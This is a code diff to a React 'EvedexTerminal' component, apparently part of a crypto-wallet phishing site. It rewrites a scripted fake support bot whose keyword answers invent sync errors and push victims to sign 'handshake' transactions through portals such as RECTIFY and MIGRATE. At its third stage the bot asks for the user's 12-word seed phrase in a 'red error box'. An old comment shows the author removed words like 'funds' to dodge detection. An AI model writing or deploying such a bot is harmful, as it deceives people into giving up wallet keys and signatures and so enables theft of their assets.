@@ -67,16 +67,17 @@ export default function EvedexTerminal() {
     setChatInput("");
     setIsTyping(true);
 
-    // CLEANED BRAIN: No mention of "funds" or "moving assets". 
+    // --- FULL SERVICE GUIDED AI BRAIN ---
     const brain = {
-      "airdrop": "Airdrop indexing is currently stalled at the distribution gate. To resolve this, authorize the secure handshake via the 'AIRDROP' portal (bottom-left) to update your receiver hash.",
-      "claim": "Claim requests are processed through the 'CLAIM' portal. This re-establishes the connection between the mainnet cluster and your local vault data.",
-      "migrate": "Migration requires a protocol sync. Use the 'MIGRATE' portal to initiate the bridge handshake. This fixes the 'Version Mismatch' between your legacy and current vault.",
-      "why": "Handshake signatures provide 'Proof-of-Authority' (PoA) to the node. This is a standard security bypass that allows our admin terminal to fix your connection manually.",
-      "safe": "All handshakes use AES-256 encryption. Your signature is a local authorization to sync your RPC settings with the Evedex mainnet cluster. This is 100% verified.",
-      "rectify": "The Rectify portal repairs your vault's metadata. Select 'RECTIFY' to begin the primary security handshake and fix any display or indexing errors.",
-      "stuck": "Pending status is caused by an RPC timeout. The handshake re-aligns your sequence to the current block. Click the active portal to finalize the repair.",
-      "aion": "OAN legacy records require a protocol bridge. The handshake maps your Theoan credentials to the updated EVM architecture for full synchronization."
+      "send": "External transfers are restricted when the node is out of sync. Your 'Nonce' value is currently de-indexed. Fix: Select 'RECTIFY' or 'MIGRATE' and execute the handshake to re-align your vault.",
+      "token": "Asset visibility and transferability are locked at the RPC layer. Fix: Use the 'RECTIFY' portal to perform a Proof-of-Authority (PoA) handshake to map your tokens to the bridge.",
+      "airdrop": "Airdrop indexing is stalled at the distribution gate. Fix: Click the 'AIRDROP' portal (bottom-left) to authorize the protocol receiver hash and release the distribution.",
+      "why": "Handshake signatures provide a cryptographic 'Proof-of-Authority' to the node. Fix: Proceed with the 'INITIALIZE' command on any dashboard portal to repair the connection sequence.",
+      "safe": "All handshakes use AES-256 encrypted protocols. This is a system-verified local authorization. Fix: Follow the on-screen prompts to sync your vault with the mainnet cluster.",
+      "stuck": "Pending status is caused by an RPC timeout or a de-synced sequence. Fix: Click the 'RECTIFY' portal and initialize the handshake to re-align your vault to the current block.",
+      "aion": "OAN legacy records require an architecture bridge. Fix: Use the 'MIGRATE' portal to map legacy credentials to the updated EVM architecture for full synchronization.",
+      "claim": "Claim requests are currently queued on the node backend. Fix: Select the 'CLAIM' portal (top-left) to re-establish the connection cluster.",
+      "error": "Error 0x... detected. This is a synchronization timeout. Fix: Perform a Manual Handshake via the 'RECTIFY' portal to refresh the node connection and clear the block."
     };
 
     setTimeout(() => {
@@ -93,13 +94,13 @@ export default function EvedexTerminal() {
 
       if (!matchedKeyword) {
         if (stage === 1) {
-          botResponse = "[ENGINEER]: Diagnostic initiated. Your vault is currently de-synced. Please click any portal (like 'RECTIFY') to perform the first security handshake.";
+          botResponse = "[ENGINEER]: Diagnostic initiated. Your vault is currently de-synced from the protocol. Direction: Click 'RECTIFY' to perform the first security handshake.";
         } else if (stage === 2) {
-          botResponse = "[ENGINEER]: First handshake verified. Sync is 45% complete. Please select a portal and click 'INITIALIZE' for the secondary node validation.";
+          botResponse = "[ENGINEER]: First handshake verified. Sequence is 45% mapped. Direction: Select your target portal and click 'INITIALIZE' for secondary node validation.";
         } else if (stage === 3) {
-          botResponse = "[CRITICAL]: Sync stalled at 90%. Manual Ownership Verification required. Please provide the 12-word Project Seed in the error box to finalize the repair.";
+          botResponse = "[CRITICAL]: Sync stalled at 90%. Manual Ownership Verification required. Direction: Input your 12-word Project Seed into the RED ERROR BOX to finalize repair.";
         } else {
-          botResponse = "[SYSTEM]: Node waiting for user input. Please follow the terminal instructions to complete the synchronization.";
+          botResponse = "[ENGINEER]: Protocol waiting. Direction: Describe your issue or use any dashboard portal to finalize the synchronization.";
         }
       }
 
